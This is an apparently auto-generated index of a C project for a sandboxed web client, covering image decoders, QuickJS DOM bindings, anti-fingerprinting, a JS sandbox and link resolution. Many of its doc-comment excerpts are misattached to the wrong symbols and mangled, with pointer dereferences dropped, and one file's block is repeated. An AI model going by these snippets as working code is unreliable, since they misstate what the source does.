- `img_png_dimensions` (line 56) `img_status img_png_dimensions(const uint8_t *bytes, size_t len,
                              uin...`
- `img_dimensions_ok` (line 67) `int img_dimensions_ok(uint32_t w, uint32_t h)`
- `img_fit` (line 75) `void img_fit(uint32_t iw, uint32_t ih, double box_w, double box_h,
             double *out_w, do...`
- `premultiply` (line 90) `static void premultiply(uint8_t *data, size_t pixels)` - *void img_fit(uint32_t iw, uint32_t ih, double box_w, double box_h, double *out_w, double *out_h) { if (out_w == NULL || out_h == NULL) return; out_w = 0.0; out_h = 0.0; if (iw == 0u || ih == 0u || box_w <= 0.0 || box_h <= 0.0) return; double sx = box_w / (double)iw; double sy = box_h / (double)ih; double s = (sx < sy) ? sx : sy; out_w = (double)iw * s; out_h = (double)ih * s; } /* Premultiplies straight-alpha BGRA in place: c' = round(c * a / 255).*
- `img_decode_png` (line 101) `img_status img_decode_png(const uint8_t *bytes, size_t len, img_pixels *out)`
- `jpeg_error_longjmp` (line 157) `static void jpeg_error_longjmp(j_common_ptr cinfo)`
- `jpeg_silence` (line 164) `static void jpeg_silence(j_common_ptr cinfo)` - *libjpeg error manager that longjmps instead of calling exit(), so a hostile JPEG * fails closed (IMG_ERR_DECODE) without tearing the worker down. struct jpeg_err_ctx { struct jpeg_error_mgr pub; jmp_buf jb; }; static void jpeg_error_longjmp(j_common_ptr cinfo) { struct jpeg_err_ctx *e = (struct jpeg_err_ctx *)cinfo->err; longjmp(e->jb, 1); } /* Swallow libjpeg's warning/trace text; the worker has no business writing to stderr.*
- `img_decode_jpeg` (line 165) `img_status img_decode_jpeg(const uint8_t *bytes, size_t len, img_pixels *out)`
- `gr_u8` (line 259) `static int gr_u8(gif_reader *r, uint8_t *out)`
- `gr_u16le` (line 265) `static int gr_u16le(gif_reader *r, uint16_t *out)`
- `gr_skip` (line 272) `static int gr_skip(gif_reader *r, size_t n)`
- `gr_skip_subblocks` (line 280) `static int gr_skip_subblocks(gif_reader *r)` - *static int gr_u16le(gif_reader *r, uint16_t *out) { if (r->pos + 2u > r->len) return 0; out = (uint16_t)(r->p[r->pos] | ((uint16_t)r->p[r->pos + 1] << 8)); r->pos += 2u; return 1; } static int gr_skip(gif_reader *r, size_t n) { if (r->pos + n > r->len) return 0; r->pos += n; return 1; } /* Skips a chain of data sub-blocks up to and including the 0 terminator.*
- `gb_next_code` (line 297) `static int gb_next_code(gif_bits *b, unsigned width, unsigned *out)`
- `gif_deinterlace_row` (line 319) `static uint32_t gif_deinterlace_row(uint32_t r, uint32_t fh)` - *} uint8_t byte; if (!gr_u8(b->r, &byte)) return 0; b->block_left--; b->acc |= (uint32_t)byte << b->nbits; b->nbits += 8u; } out = b->acc & ((1u << width) - 1u); b->acc >>= width; b->nbits -= width; return 1; } /* Visual row of interlaced-frame row `r` (4-pass GIF interlace).*
- `gif_put_pixel` (line 334) `static void gif_put_pixel(uint32_t *canvas, uint32_t cw, uint32_t ch,
                          u...` - *Writes one palette pixel into the canvas at frame-relative index i (clipped to * the canvas; transparent index -> 0x00000000, already premultiplied).*
- `img_decode_gif` (line 353) `img_status img_decode_gif(const uint8_t *bytes, size_t len, img_pixels *out)`
- `img_decode_webp` (line 519) `img_status img_decode_webp(const uint8_t *bytes, size_t len, img_pixels *out)`
- `img_decode` (line 552) `img_status img_decode(const uint8_t *bytes, size_t len, img_pixels *out)`
- `img_pixels_free` (line 565) `void img_pixels_free(img_pixels *p)`
- `img_format_name` (line 574) `const char *img_format_name(img_format f)`

**Macros:**
- `PNG_IHDR_MIN` (line 34)
- `GIF_LZW_MAX_CODES` (line 252)

**Structs:**
- `jpeg_err_ctx` (line 153) - *libjpeg error manager that longjmps instead of calling exit(), so a hostile JPEG * fails closed (IMG_ERR_DECODE) without tearing the worker down.*
- `gif_reader` (line 255)
- `gif_bits` (line 290) - *return 1; } /* Skips a chain of data sub-blocks up to and including the 0 terminator. static int gr_skip_subblocks(gif_reader *r) { uint8_t n; for (;;) { if (!gr_u8(r, &n)) return 0; if (n == 0u) return 1; if (!gr_skip(r, n)) return 0; } } /* Bit reader over the LZW data sub-block chain, LSB-first.*

#### `js_dom.c`
**Path:** `src/js_dom.c`

**Functions:**
- `jd_opaque_get` (line 24) `static jd_opaque *jd_opaque_get(JSContext *ctx)` - *include "quickjs.h"*
- `jd_idx` (line 28) `static dom_index *jd_idx(JSContext *ctx)`
- `jd_handle` (line 38) `static int jd_handle(JSContext *ctx, JSValueConst v, dom_node_id *out)` - *Coerces a JS argument to a node handle. Returns -1 with a pending exception if coercion threw; otherwise stores the handle (out-of-range values stay * out of range and are rejected later by the dom validators).*
- `jd_handle_or_null` (line 44) `static JSValue jd_handle_or_null(JSContext *ctx, dom_node_id h)`
- `m_node_count` (line 50) `static JSValue m_node_count(JSContext *ctx, JSValueConst this_val,
                            in...` - *if coercion threw; otherwise stores the handle (out-of-range values stay * out of range and are rejected later by the dom validators). static int jd_handle(JSContext *ctx, JSValueConst v, dom_node_id *out) { int64_t n; if (JS_ToInt64(ctx, &n, v) != 0) return -1; out = (n < 0 || n > 0xFFFFFFFELL) ? DOM_NODE_NONE : (dom_node_id)n; return 0; } static JSValue jd_handle_or_null(JSContext *ctx, dom_node_id h) { return (h == DOM_NODE_NONE) ? JS_NULL : JS_NewInt64(ctx, (int64_t)h); } /* --- native methods ---*
- `m_get_element_by_id` (line 56) `static JSValue m_get_element_by_id(JSContext *ctx, JSValueConst this_val,
                       ...`
- `jd_query_list` (line 68) `static JSValue jd_query_list(JSContext *ctx, JSValueConst arg, int by_class)` - *return JS_NewInt64(ctx, (int64_t)dom_node_count(jd_idx(ctx))); } static JSValue m_get_element_by_id(JSContext *ctx, JSValueConst this_val, int argc, JSValueConst *argv) { (void)this_val; (void)argc; const char *s = JS_ToCString(ctx, argv[0]); if (s == NULL) return JS_EXCEPTION; dom_node_id h = dom_get_element_by_id(jd_idx(ctx), s); JS_FreeCString(ctx, s); return jd_handle_or_null(ctx, h); } /* Shared body for getByTag / getByClass (by_class selected by the flag).*
- `m_get_by_tag` (line 97) `static JSValue m_get_by_tag(JSContext *ctx, JSValueConst this_val,
                            in...`
- `m_get_by_class` (line 103) `static JSValue m_get_by_class(JSContext *ctx, JSValueConst this_val,
                            ...`
- `m_tag_name` (line 109) `static JSValue m_tag_name(JSContext *ctx, JSValueConst this_val,
                          int ar...`
- `m_get_attribute` (line 119) `static JSValue m_get_attribute(JSContext *ctx, JSValueConst this_val,
                           ...`
- `m_parent` (line 132) `static JSValue m_parent(JSContext *ctx, JSValueConst this_val,
                        int argc, ...`
- `m_first_child` (line 140) `static JSValue m_first_child(JSContext *ctx, JSValueConst this_val,
                             ...`
- `m_next_sibling` (line 148) `static JSValue m_next_sibling(JSContext *ctx, JSValueConst this_val,
                            ...`
- `m_precedes` (line 156) `static JSValue m_precedes(JSContext *ctx, JSValueConst this_val,
                          int ar...`
- `m_text_content` (line 167) `static JSValue m_text_content(JSContext *ctx, JSValueConst this_val,
                            ...` - *if (jd_handle(ctx, argv[0], &h) < 0) return JS_EXCEPTION; return jd_handle_or_null(ctx, dom_next_sibling(jd_idx(ctx), h)); } static JSValue m_precedes(JSContext *ctx, JSValueConst this_val, int argc, JSValueConst *argv) { (void)this_val; (void)argc; dom_node_id a, b; if (jd_handle(ctx, argv[0], &a) < 0) return JS_EXCEPTION; if (jd_handle(ctx, argv[1], &b) < 0) return JS_EXCEPTION; return JS_NewBool(ctx, dom_precedes(jd_idx(ctx), a, b)); } /* --- mutators (live JS): backed by the memory-safe dom_set_* (detach, never free) ---*
- `m_set_text` (line 177) `static JSValue m_set_text(JSContext *ctx, JSValueConst this_val,
                          int ar...`
- `m_get_title` (line 191) `static JSValue m_get_title(JSContext *ctx, JSValueConst this_val,
                           int ...`
- `m_set_title` (line 199) `static JSValue m_set_title(JSContext *ctx, JSValueConst this_val,
                           int ...`
- `m_create_element` (line 212) `static JSValue m_create_element(JSContext *ctx, JSValueConst this_val,
                          ...` - *} static JSValue m_set_title(JSContext *ctx, JSValueConst this_val, int argc, JSValueConst *argv) { (void)this_val; (void)argc; size_t len = 0; const char *s = JS_ToCStringLen(ctx, &len, argv[0]); if (s == NULL) return JS_EXCEPTION; (void)dom_set_document_title(jd_idx(ctx), s, len); JS_FreeCString(ctx, s); return JS_UNDEFINED; } /* --- DOM construction (live JS, Hito 20c) ---*
- `m_append_child` (line 224) `static JSValue m_append_child(JSContext *ctx, JSValueConst this_val,
                            ...`
- `m_remove_child` (line 233) `static JSValue m_remove_child(JSContext *ctx, JSValueConst this_val,
                            ...`
- `m_set_attribute` (line 242) `static JSValue m_set_attribute(JSContext *ctx, JSValueConst this_val,
                           ...`
- `m_remove_attribute` (line 258) `static JSValue m_remove_attribute(JSContext *ctx, JSValueConst this_val,
                        ...`
- `m_set_inner_html` (line 270) `static JSValue m_set_inner_html(JSContext *ctx, JSValueConst this_val,
                          ...`
- `m_get_inner_html` (line 287) `static JSValue m_get_inner_html(JSContext *ctx, JSValueConst this_val,
                          ...` - *innerHTML getter (2026-07-11): serializes the node's children (bounded in dom.c; * over-cap or invalid handle yields "" -- a getter never throws page scripts dead).*
- `m_register_click` (line 308) `static JSValue m_register_click(JSContext *ctx, JSValueConst this_val,
                          ...`
- `m_register_submit` (line 330) `static JSValue m_register_submit(JSContext *ctx, JSValueConst this_val,
                         ...`
- `m_register_event` (line 355) `static JSValue m_register_event(JSContext *ctx, JSValueConst this_val,
                          ...` - *Generic event registration: dom.registerEvent(node_id, event_type, fn). * Stores in __eventRegistry[node_id][event_type] = [fn, ...].*
- `m_query_selector` (line 416) `static JSValue m_query_selector(JSContext *ctx, JSValueConst this_val,
                          ...` - *JS_FreeValue(ctx, lv); JS_SetPropertyUint32(ctx, type_arr, (uint32_t)len, JS_DupValue(ctx, argv[2])); JS_FreeValue(ctx, type_arr); JS_FreeValue(ctx, node_map); JS_FreeValue(ctx, reg); JS_FreeValue(ctx, global); JS_FreeCString(ctx, type); return JS_UNDEFINED; } /* --- CSS-selector queries (querySelector / matches / closest) --- /* dom.querySelector(root, sel): root is a handle or -1 for document scope.*
- `m_query_selector_all` (line 429) `static JSValue m_query_selector_all(JSContext *ctx, JSValueConst this_val,
                      ...` - */* dom.querySelector(root, sel): root is a handle or -1 for document scope. static JSValue m_query_selector(JSContext *ctx, JSValueConst this_val, int argc, JSValueConst *argv) { (void)this_val; (void)argc; dom_node_id root; if (jd_handle(ctx, argv[0], &root) < 0) return JS_EXCEPTION; const char *sel = JS_ToCString(ctx, argv[1]); if (sel == NULL) return JS_EXCEPTION; dom_node_id h = dom_query_selector(jd_idx(ctx), root, sel); JS_FreeCString(ctx, sel); return jd_handle_or_null(ctx, h); } /* dom.querySelectorAll(root, sel) -> array of handles.*
- `m_matches` (line 457) `static JSValue m_matches(JSContext *ctx, JSValueConst this_val,
                         int argc...`
- `m_closest` (line 469) `static JSValue m_closest(JSContext *ctx, JSValueConst this_val,
                         int argc...`
- `m_attr_names` (line 481) `static JSValue m_attr_names(JSContext *ctx, JSValueConst this_val,
                            in...`
- `attrNames` (line 561) `* native attrNames(). jQuery's feature detection reads attrs[name].expando, so
     * a missing '...`
- `js_env` (line 965) `* are owned by js_env (anti_fp) and are NOT redefined here. Runs after the
 * document shim (uses...`
- `jd_lp_set` (line 1276) `static void jd_lp_set(JSContext *ctx, JSValue obj, const char *name,
                      const ...` - *Defines a string property on the __locParts data object from a (ptr,len) span. * The span is copied into an engine string; a NULL span becomes "".*
- `jd_install` (line 1317) `jd_status jd_install(js_context *ctx, dom_index *idx, jd_opaque *opaque)`
- `fails` (line 1378) `* cap is reached or an allocation fails (caller stops), else 0. */
static int cb_append(char **bu...`
- `jd_install_console` (line 1447) `jd_status jd_install_console(js_context *ctx, fb_buffer *log)`
- `jd_set_location` (line 1483) `jd_status jd_set_location(js_context *ctx, const char *href, const url_parts *parts)`
- `jd_set_cookies` (line 1517) `jd_status jd_set_cookies(js_context *ctx, const char *cookies)`
- `jd_get_cookies` (line 1537) `int jd_get_cookies(js_context *ctx, char *buf, size_t bufsz)`
- `jd_take_nav_request` (line 1559) `int jd_take_nav_request(js_context *ctx, char *buf, size_t bufsz, int *replace)`
- `jd_pack_ptr` (line 1602) `static void jd_pack_ptr(JSContext *ctx, JSValue *out2, const void *p)` - *Carry the host fetch fn + its ctx as a function's closure data, each split into 32-bit halves (no assumption about JS number width). The data lives with the * function object and is freed with the context: no global state, no leak.*
- `jd_unpack_ptr` (line 1607) `static void *jd_unpack_ptr(JSContext *ctx, JSValueConst lo, JSValueConst hi)`
- `m_host_fetch` (line 1620) `static JSValue m_host_fetch(JSContext *ctx, JSValueConst this_val,
                            in...` - *__hostFetch(method, url, body) -> { status, body, contentType }. The ONLY network primitive exposed to script; it does NOT touch a socket -- it calls the host fetch callback, which proxies to the trusted parent (full network policy re-applied there). Fail-closed: a refused/failed request yields { status:0, body:'', contentType:'' }, * never an exception that tells the page why.*
- `jd_install_xhr` (line 1699) `jd_status jd_install_xhr(js_context *ctx, jd_fetch_fn fn, void *fetch_ctx)`
- `jd_click_state_new` (line 1729) `jd_click_state *jd_click_state_new(void)`
- `jd_click_state_free` (line 1734) `void jd_click_state_free(jd_click_state *s)`
- `jd_install_events` (line 1738) `jd_status jd_install_events(js_context *ctx, jd_click_state *state)`
- `jd_fire_click` (line 1749) `int jd_fire_click(js_context *ctx, dom_node_id node_id)`
- `jd_fire_submit` (line 1778) `int jd_fire_submit(js_context *ctx, dom_node_id form_node_id)` - *Fires the submit event for form_node_id. Returns 0 if preventDefault() was * called, 1 if the default action should proceed.*
- `jd_escape_js_str` (line 1806) `static size_t jd_escape_js_str(const char *src, char *dst, size_t dstsz)` - *Escapes a string for safe interpolation into JS double-quoted string literal: replaces backslash with \\ and double-quote with \". Returns number of bytes * written. Truncates if dst is too small (intended for bounded stack buffers).*
- `jd_fire_mouse_event` (line 1885) `int jd_fire_mouse_event(js_context *ctx, dom_node_id node_id,
                        const char ...`
- `try_create_iframe_from_script` (line 1978) `static int try_create_iframe_from_script(dom_index *idx,
                                        ...` - *Scans an inline script body for `video[N]` or `video_data` assignment and extracts the first usable iframe src. Returns 1 if an iframe was * created in the DOM, 0 otherwise.*
- `jd_video_from_scripts` (line 2094) `size_t jd_video_from_scripts(dom_index *idx, const char *const *script_texts,
                   ...`
- `jd_inject_video_shim` (line 2133) `jd_status jd_inject_video_shim(js_context *ctx)`
- `scan_m3u8_url` (line 2148) `static int scan_m3u8_url(const char *body, size_t blen,
                          char *out, size...` - *Scans `body` (length `blen`) for `.m3u8` URLs and writes the first one found into `out` (bounded by `outsz`). Returns 1 if found, 0 otherwise. * Looks for patterns like: https://...m3u8... (with optional query params).*
- `jd_process_iframes` (line 2185) `void jd_process_iframes(js_context *ctx, dom_index *idx,
                        jd_fetch_fn fn, ...` - *+url_end; size_t ulen = (size_t)(url_end - url_start); if (ulen > 0 && ulen < outsz) { memcpy(out, url_start, ulen); out[ulen] = '\0'; return 1; } } } return 0; } /* Maximum number of iframes we track as "already processed" to avoid re-fetching. define JD_IFRAME_TRACK_MAX 16*

**Macros:**
- `_GNU_SOURCE` (line 9)
- `JD_IFRAME_TRACK_MAX` (line 2184)

**Structs:**
- `jd_method` (line 303)
- `jd_click_state` (line 1726)

#### `js_env.c`
**Path:** `src/js_env.c`

**Functions:**
- `wall_clock_ms` (line 34) `static uint64_t wall_clock_ms(void)` - *#include "anti_fp.h" #include "js_sandbox.h" #include <stdint.h> #include <stdio.h> #include <stdlib.h> #include <string.h> #include <sys/random.h> #include <time.h> #include "quickjs.h" /* --- clocks (the only host I/O in this module) ---*
- `monotonic_ms` (line 40) `static double monotonic_ms(void)`
- `m_date_now` (line 48) `static JSValue m_date_now(JSContext *ctx, JSValueConst this_val,
                          int ar...` - *static uint64_t wall_clock_ms(void) { struct timespec ts; if (clock_gettime(CLOCK_REALTIME, &ts) != 0) return 0; return (uint64_t)ts.tv_sec * 1000u + (uint64_t)ts.tv_nsec / 1000000u; } static double monotonic_ms(void) { struct timespec ts; if (clock_gettime(CLOCK_MONOTONIC, &ts) != 0) return 0.0; return (double)ts.tv_sec * 1000.0 + (double)ts.tv_nsec / 1000000.0; } /* --- native clock methods ---*
- `m_perf_now` (line 57) `static JSValue m_perf_now(JSContext *ctx, JSValueConst this_val,
                          int ar...` - *performance.now: coarsened elapsed since the origin bound at install time, so * it never leaks the host uptime.*
- `m_empty_array` (line 76) `static JSValue m_empty_array(JSContext *ctx, JSValueConst this_val,
                             ...`
- `m_get_random_values` (line 84) `static JSValue m_get_random_values(JSContext *ctx, JSValueConst this_val,
                       ...` - *timing (Zero Knowledge) while keeping analytics scripts from throwing. static JSValue m_noop(JSContext *ctx, JSValueConst this_val, int argc, JSValueConst *argv) { (void)ctx; (void)this_val; (void)argc; (void)argv; return JS_UNDEFINED; } static JSValue m_empty_array(JSContext *ctx, JSValueConst this_val, int argc, JSValueConst *argv) { (void)this_val; (void)argc; (void)argv; return JS_NewArray(ctx); } /* --- crypto native functions (Hito 30b: blend-in surface) ---*
- `m_random_uuid` (line 124) `static JSValue m_random_uuid(JSContext *ctx, JSValueConst this_val,
                             ...`
- `m_subtle_null` (line 141) `static JSValue m_subtle_null(JSContext *ctx, JSValueConst this_val,
                             ...`
- `def_val` (line 153) `static int def_val(JSContext *ctx, JSValueConst obj, const char *name, JSValue v)` - *Always takes ownership of v: JS_DefinePropertyValueStr consumes it (freeing it even when the define fails). An exception value is an immediate with nothing * to free. Callers must never free a value after handing it here.*
- `def_str` (line 158) `static int def_str(JSContext *ctx, JSValueConst obj, const char *name, const char *s)`
- `def_int` (line 162) `static int def_int(JSContext *ctx, JSValueConst obj, const char *name, int32_t n)`
- `def_fn` (line 166) `static int def_fn(JSContext *ctx, JSValueConst obj, const char *name,
                  JSCFuncti...`
- `build_languages` (line 174) `static JSValue build_languages(JSContext *ctx)` - *navigator.languages: a sealed array built by splitting fp_accept_language() * (e.g. "en-US,en") on commas. Returns an exception value on OOM.*
- `build_navigator` (line 197) `static int build_navigator(JSContext *ctx, JSValueConst global)`
- `build_screen` (line 294) `static int build_screen(JSContext *ctx, JSValueConst global, int w, int h)`
- `build_crypto` (line 338) `static int build_crypto(JSContext *ctx, JSValueConst global)` - *define PERF_ORIGIN_EPOCH 1700000000000.0*
- `build_perf_timing` (line 366) `static int build_perf_timing(JSContext *ctx, JSValueConst perf)`
- `build_perf_navigation` (line 380) `static int build_perf_navigation(JSContext *ctx, JSValueConst perf)`
- `build_performance` (line 392) `static int build_performance(JSContext *ctx, JSValueConst global)`
- `override_date_now` (line 425) `static int override_date_now(JSContext *ctx, JSValueConst global)` - *Replaces the built-in Date.now with the coarsened version, non-writable and * non-configurable so a script cannot restore a high-resolution clock.*
- `make_readback` (line 468) `static JSValue make_readback(JSContext *ctx, uint64_t key)`
- `build_readback_obj` (line 476) `static int build_readback_obj(JSContext *ctx, JSValueConst global,
                              ...`
- `je_install` (line 489) `je_status je_install(js_context *ctx, int screen_w, int screen_h)`
- `je_install_canvas` (line 508) `je_status je_install_canvas(js_context *ctx, uint64_t readback_key)`

**Macros:**
- `_POSIX_C_SOURCE` (line 16)
- `FP_MIME_COUNT` (line 253)
- `PERF_ORIGIN_EPOCH` (line 337)

#### `js_policy.c`
**Path:** `src/js_policy.c`

**Functions:**
- `eq_ci` (line 12) `static int eq_ci(const char *a, const char *b)` - *js_policy — implementation: pure per-host JavaScript policy decision.  No I/O, no global state. Fail-closed: an unknown mode never enables JS.  #include "js_policy.h" #include <string.h> /* Case-insensitive ASCII equality (no locale dependence).*
- `jsp_enabled` (line 21) `bool jsp_enabled(jsp_mode mode, int host_allowlisted)`
- `jsp_trusted` (line 30) `bool jsp_trusted(bool js_enabled, int host_allowlisted)`
- `jsp_present_trusted` (line 34) `bool jsp_present_trusted(int host_allowlisted)`
- `jsp_mode_from_str` (line 38) `jsp_mode jsp_mode_from_str(const char *s)`
- `jsp_mode_str` (line 50) `const char *jsp_mode_str(jsp_mode mode)`

#### `js_sandbox.c`
**Path:** `src/js_sandbox.c`

**Functions:**
- `jm_malloc` (line 44) `static void *jm_malloc(void *opaque, size_t size)` - *int    hit; /* sticky within one eval: an allocation was denied by the cap } js_mem_state; struct js_context { JSRuntime      *rt; JSContext      *ctx; js_mem_state    mem;       /* heap accounting + cap enforcement js_limits       limits;    /* resolved limits in effect for this context struct timespec deadline;  /* armed per-eval when has_deadline != 0 int             has_deadline; int             interrupted; /* set by the interrupt handler on timeout }; /* --- bounded allocator (QuickJS backend) ---*
- `jm_calloc` (line 52) `static void *jm_calloc(void *opaque, size_t count, size_t size)`
- `jm_free` (line 62) `static void jm_free(void *opaque, void *ptr)`
- `jm_realloc` (line 68) `static void *jm_realloc(void *opaque, void *ptr, size_t size)`
- `jm_usable_size` (line 78) `static size_t jm_usable_size(const void *ptr)`
- `host_dup` (line 88) `static char *host_dup(const char *src, size_t len)` - *if (p == NULL && size != 0) return NULL; /* original ptr left untouched m->used = m->used - old + ((p != NULL) ? malloc_usable_size(p) : 0); return p; } static size_t jm_usable_size(const void *ptr) { return malloc_usable_size((void *)ptr); } static const JSMallocFunctions FREEDOM_MF = { jm_calloc, jm_malloc, jm_free, jm_realloc, jm_usable_size }; /* --- helpers ---*
- `timespec_reached` (line 97) `static int timespec_reached(const struct timespec *now, const struct timespec *deadline)`
- `js_interrupt_cb` (line 104) `static int js_interrupt_cb(JSRuntime *rt, void *opaque)` - *if (len == (size_t)-1) return NULL; /* guard: len+1 would overflow to 0 char *out = (char *)malloc(len + 1); if (out == NULL) return NULL; if (len != 0 && src != NULL) memcpy(out, src, len); out[len] = '\0'; return out; } static int timespec_reached(const struct timespec *now, const struct timespec *deadline) { if (now->tv_sec != deadline->tv_sec) return now->tv_sec > deadline->tv_sec; return now->tv_nsec >= deadline->tv_nsec; } /* Returns nonzero to interrupt the engine once the per-eval budget is spent.*
- `is_ascii_digit` (line 116) `static int is_ascii_digit(char c)`
- `js_loc_from_stack` (line 118) `int js_loc_from_stack(const char *stack, char *file_out, size_t file_cap,
                      i...`
- `js_limits_default` (line 236) `js_limits js_limits_default(void)` - *if (out_col  != NULL) *out_col  = cl; } JS_FreeCString(ctx, ss); } else { JS_FreeValue(ctx, JS_GetException(ctx)); /* ToCString may have thrown } } JS_FreeValue(ctx, st); JS_FreeValue(ctx, exc); return msg; } /* --- public: defaults & validator ---*
- `limits_resolve` (line 245) `static js_limits limits_resolve(const js_limits *lim)`
- `js_validate_source` (line 254) `js_status js_validate_source(const char *src, size_t len, const js_limits *lim)`
- `js_context_new` (line 265) `js_status js_context_new(const js_limits *lim, js_context **out)` - *if (l.time_budget_ms == 0)     l.time_budget_ms     = JS_DEFAULT_TIME_BUDGET; return l; } js_status js_validate_source(const char *src, size_t len, const js_limits *lim) { if (src == NULL) return JS_ERR_NULL_ARG; size_t cap = (lim != NULL && lim->max_source_bytes != 0) ? lim->max_source_bytes : JS_DEFAULT_MAX_SOURCE; if (len == 0) return JS_ERR_EMPTY; if (len > cap) return JS_ERR_TOO_LARGE; return JS_OK; } /* --- public: lifecycle ---*
- `js_context_free` (line 304) `void js_context_free(js_context *ctx)`
- `arm_deadline` (line 313) `static void arm_deadline(js_context *ctx, uint64_t budget_ms)` - *c->has_deadline = 0; c->interrupted = 0; out = c; return JS_OK; } void js_context_free(js_context *ctx) { if (ctx == NULL) return; if (ctx->ctx != NULL) JS_FreeContext(ctx->ctx); if (ctx->rt != NULL) JS_FreeRuntime(ctx->rt); free(ctx); } /* --- public: evaluation ---*
- `js_set_time_budget` (line 328) `void js_set_time_budget(js_context *ctx, uint64_t budget_ms)`
- `js_eval` (line 333) `js_status js_eval(js_context *ctx, const char *src, size_t len, js_result *res)`
- `js_eval_named` (line 337) `js_status js_eval_named(js_context *ctx, const char *src, size_t len,
                        con...`
- `js_pump_jobs` (line 420) `int js_pump_jobs(js_context *ctx, int max_jobs)`
- `js_eval_once` (line 438) `js_status js_eval_once(const char *src, size_t len, const js_limits *lim, js_result *res)`
- `js_result_free` (line 451) `void js_result_free(js_result *res)`
- `js_set_current_script` (line 464) `void js_set_current_script(js_context *ctx, const char *src, const char *type)`
- `js_context_raw` (line 513) `void *js_context_raw(js_context *ctx)`

**Macros:**
- `_POSIX_C_SOURCE` (line 11)

**Structs:**
- `js_mem_state` (line 27) - *We enforce the heap cap ourselves (not via JS_SetMemoryLimit, whose check runs *inside* QuickJS before our allocator and is therefore unobservable). Leaving QuickJS's own limit at its default (0 == unlimited) makes this the * sole enforcer, so a denied allocation is a deterministic, testable signal.*
- `js_context` (line 33)

#### `link_nav.c`
**Path:** `src/link_nav.c`

**Functions:**
- `clean_href` (line 19) `static int clean_href(const char *href, char *out, size_t outsz)` - *Removes tab/newline/CR anywhere and trims leading/trailing spaces, in place * into out. Returns 0, or -1 if the href does not fit in out.*
- `ci_prefix` (line 38) `static int ci_prefix(const char *s, const char *prefix)` - *if (o + 1 >= outsz) return -1; out[o++] = (char)c; } out[o] = '\0'; size_t start = 0; while (out[start] == ' ') ++start; if (start > 0) memmove(out, out + start, strlen(out + start) + 1); size_t len = strlen(out); while (len > 0 && out[len - 1] == ' ') out[--len] = '\0'; return 0; } /* Case-insensitive: does s begin with prefix?*
- `classify_block` (line 62) `static ln_block_reason classify_block(const char *ref)` - *Splits the fragment (everything after the first '#') out of ref: copies the fragment id (without '#') into frag, then truncates ref at the '#'. A fragment * that does not fit is dropped (frag becomes ""), never truncated to a partial id. static void split_fragment(char *ref, char *frag, size_t fragsz) { frag[0] = '\0'; char *hash = strchr(ref, '#'); if (hash == NULL) return; const char *f = hash + 1; size_t fl = strlen(f); if (fl + 1 <= fragsz) memcpy(frag, f, fl + 1); hash = '\0'; } /* Classifies why a fragment-less reference could not become a navigable target.*
- `file_dir_len` (line 69) `static size_t file_dir_len(const char *base)` - *const char *f = hash + 1; size_t fl = strlen(f); if (fl + 1 <= fragsz) memcpy(frag, f, fl + 1); hash = '\0'; } /* Classifies why a fragment-less reference could not become a navigable target. static ln_block_reason classify_block(const char *ref) { if (ci_prefix(ref, "http://")) return LN_BLOCK_DOWNGRADE; if (url_has_scheme(ref)) return LN_BLOCK_FOREIGN_SCHEME; return LN_BLOCK_UNSUPPORTED; } /* Length of base up to and including the last '/'; 0 when base has no '/'.*
- `last_seg_is_dotdot` (line 79) `static int last_seg_is_dotdot(const char *body, size_t blen)` - *return LN_BLOCK_UNSUPPORTED; } /* Length of base up to and including the last '/'; 0 when base has no '/'. static size_t file_dir_len(const char *base) { size_t last = 0; int found = 0; for (size_t i = 0; base[i] != '\0'; ++i) { if (base[i] == '/') { last = i; found = 1; } } return found ? last + 1 : 0; } /* Nonzero iff the last segment of body[0..blen) is exactly "..".*
- `append_seg` (line 86) `static int append_seg(char *body, size_t bodysz, size_t *blen,
                      const char *...` - *for (size_t i = 0; base[i] != '\0'; ++i) { if (base[i] == '/') { last = i; found = 1; } } return found ? last + 1 : 0; } /* Nonzero iff the last segment of body[0..blen) is exactly "..". static int last_seg_is_dotdot(const char *body, size_t blen) { size_t s = blen; while (s > 0 && body[s - 1] != '/') --s; return (blen - s == 2 && body[s] == '.' && body[s + 1] == '.'); } /* Appends seg to body (with a '/' separator when non-empty). 0, or -1 on overflow.*
- `pop_seg` (line 98) `static void pop_seg(char *body, size_t *blen)` - */* Appends seg to body (with a '/' separator when non-empty). 0, or -1 on overflow. static int append_seg(char *body, size_t bodysz, size_t *blen, const char *seg, size_t seglen) { size_t need = (*blen > 0 ? 1u : 0u) + seglen; if (*blen + need + 1 > bodysz) return -1; if (*blen > 0) body[(*blen)++] = '/'; memcpy(body + *blen, seg, seglen); blen += seglen; body[*blen] = '\0'; return 0; } /* Drops the last segment (and its preceding '/') from body.*
- `resolve_file` (line 149) `static int resolve_file(const char *base, const char *ref, char *out, size_t outsz)` - *Resolves a local file reference (relative or absolute path) against base into * out. The fragment (#...) is dropped. Returns 0, or -1 on overflow/empty.*
- `ln_resolve` (line 171) `ln_status ln_resolve(const char *base, const char *href, ln_result *out)`
- `ln_block_reason_text` (line 240) `const char *ln_block_reason_text(ln_block_reason reason)`

#### `local_store.c`
**Path:** `src/local_store.c`
**File Doc:** *include <openssl/kdf.h> ifndef OSSL_KDF_PARAM_ARGON2_LANES define OSSL_KDF_PARAM_ARGON2_LANES "lanes" endif ifndef OSSL_KDF_PARAM_ARGON2_MEMCOST define OSSL_KDF_PARAM_ARGON2_MEMCOST "memcost" endif ifndef OSSL_KDF_PARAM_THREADS define OSSL_KDF_PARAM_THREADS "threads" endif define _GNU_SOURCE include <openssl/kdf.h> ifndef OSSL_KDF_PARAM_ARGON2_LANES define OSSL_KDF_PARAM_ARGON2_LANES "lanes" endif ifndef OSSL_KDF_PARAM_ARGON2_MEMCOST define OSSL_KDF_PARAM_ARGON2_MEMCOST "memcost" endif ifndef OSSL_KDF_PARAM_THREADS define OSSL_KDF_PARAM_THREADS "threads" endif define _GNU_SOURCE include <openssl/kdf.h> ifndef OSSL_KDF_PARAM_ARGON2_LANES define OSSL_KDF_PARAM_ARGON2_LANES "lanes" endif ifndef OSSL_KDF_PARAM_ARGON2_MEMCOST define OSSL_KDF_PARAM_ARGON2_MEMCOST "memcost" endif ifndef OSSL_KDF_PARAM_THREADS*

**Functions:**
